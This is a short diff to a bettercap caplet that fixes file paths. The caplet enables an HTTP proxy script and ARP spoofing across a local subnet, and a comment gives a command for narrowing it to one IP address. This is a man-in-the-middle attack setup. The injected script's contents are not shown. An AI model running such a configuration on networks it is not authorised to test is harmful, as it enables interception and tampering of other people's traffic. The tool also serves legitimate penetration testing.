@@ -1,8 +1,8 @@
 # targeting the whole subnet by default, to make it selective:
 #
-#   sudo ./bettercap -caplet caplets/rtfm.cap -eval "set arp.spoof.targets 192.168.1.64"
+#   sudo ./bettercap -caplet rtfm.cap -eval "set arp.spoof.targets 192.168.1.64"
 
 clear
-set http.proxy.script caplets/rtfm.js
+set http.proxy.script rtfm.js
 http.proxy on
 arp.spoof on
